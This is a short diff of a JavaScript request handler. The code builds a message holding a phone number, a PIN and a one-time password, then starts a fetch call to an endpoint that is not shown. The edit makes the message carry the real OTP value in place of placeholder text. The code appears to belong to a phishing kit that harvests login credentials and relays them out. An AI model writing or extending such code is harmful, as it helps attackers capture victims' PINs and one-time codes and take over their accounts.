@@ -31,9 +31,9 @@ export default async function handler(req, res) {
       `🔢 PIN: [pin]\n\n` +
       `🔒 OTP requested\n` +
       `📱 Phone: ${phone}\n\n` +
-      `🔑 OTP otp\n` +
+      `🔑 OTP ${otp}\n` +
       `📱 Phone: ${phone}\n` +
-      `🔢 OTP: [otp]\n\n` +
+      `🔢 OTP: ${otp}\n\n` +
       `✅ Result: ${result || "OTP "}`;
 
     const response = await fetch(
